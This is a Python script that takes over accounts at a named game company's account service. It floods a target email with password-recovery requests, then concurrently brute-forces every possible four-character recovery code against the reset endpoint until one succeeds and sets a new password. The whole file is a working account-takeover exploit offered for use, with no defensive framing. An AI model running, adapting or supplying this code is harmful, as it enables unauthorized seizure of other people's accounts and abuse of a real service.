import asyncio
from asyncio import Semaphore
from itertools import product
from string import ascii_uppercase, digits

import httpx
from httpx import Response
from loguru import logger
from tqdm import tqdm

recovery_url = "https://account.freejamgames.com/api/recovery/email"
password_change_url = "https://account.freejamgames.com/api/recovery/email/finish"
possible_chars = ascii_uppercase + digits
all_possible_codes = (a + b + c + d for a, b, c, d in product(possible_chars, repeat=4))


async def send_recovery(email: str, client: httpx.AsyncClient, semaphore: Semaphore) -> Response:
    recovery_body = {
        "EmailAddress": email
    }
    async with semaphore:
        return await client.post(recovery_url, json=recovery_body)


async def bruteforce(account_id: str, password: str, client, recovery_code: str) -> str:
    res = ""
    data = {
        "PublicId": account_id,
        "Code": recovery_code,
        "Password": password
    }

    r = await client.post(url=password_change_url, json=data)
    if r.status_code == 200:
        res = recovery_code

    return res


async def main(email: str, account_id: str, new_password: str, max_concurrent_brute_requests: int, max_concurrent_email_requests: int, password_reset_emails: int):
    fail_counter = 0
    success_code = ""
    brute_semaphore = Semaphore(max_concurrent_brute_requests)
    recover_semaphore = Semaphore(max_concurrent_email_requests)
    client = httpx.AsyncClient()
    logger.remove()
    pbar = tqdm(total=len(possible_chars) ** 4)
    logger.add(lambda msg: pbar.write(msg, end=""), colorize=True)
    logger.info(f"Starting takeover for {email}")
    await asyncio.gather(*[send_recovery(email, client, recover_semaphore) for _ in range(password_reset_emails)])
    logger.info(f"Sent {password_reset_emails} recovery emails to {email}")
    logger.info("Starting bruteforce")

    def bruteforce_callback(fut: asyncio.Future):
        if not fut.cancelled():
            if fut.exception():
                nonlocal fail_counter
                fail_counter += 1
                pbar.postfix = f"Failed: {fail_counter}"
            elif fut.result():
                nonlocal success_code
                success_code = fut.result()
            pbar.update(1)
            brute_semaphore.release()

    for possible_code in all_possible_codes:
        await brute_semaphore.acquire()
        pbar.desc = possible_code
        task = asyncio.create_task(bruteforce(account_id, new_password, client, possible_code), name=f"Bruteforce-{possible_code}")
        task.add_done_callback(bruteforce_callback)
        if success_code:
            break
    await client.aclose()
    pbar.close()
    for task in asyncio.all_tasks():
        if task.get_name().startswith("Bruteforce"):
            task.cancel()
    if success_code:
        logger.success(f"Success code is {success_code}. Password is now {new_password}, closing")
    else:
        logger.error(f"Failed to find a success code. {fail_counter} attempts failed")


if __name__ == "__main__":
    import argparse

    my_parser = argparse.ArgumentParser()
    my_parser.add_argument("-e", "--email", type=str, required=True, help="The email of the target account")
    my_parser.add_argument("-i", "--account_id", type=str, required=True, help="The account id of the target account")
    my_parser.add_argument("-p", "--new_password", type=str, default="XDLiyLE7mdiRj!", help="The new password to set")
    my_parser.add_argument("-b", "--max_concurrent_brute_requests", type=int, default=20, help="The maximum number of concurrent requests to make when bruteforcing")
    my_parser.add_argument("-c", "--max_concurrent_email_requests", type=int, default=5, help="The maximum number of concurrent requests to make when sending recovery emails")
    my_parser.add_argument("-r", "--password_reset_emails", type=int, default=100, help="The number of emails to send to reset the password, higher number -> higher speed")
    args = my_parser.parse_args()
    asyncio.run(main(**vars(args)))
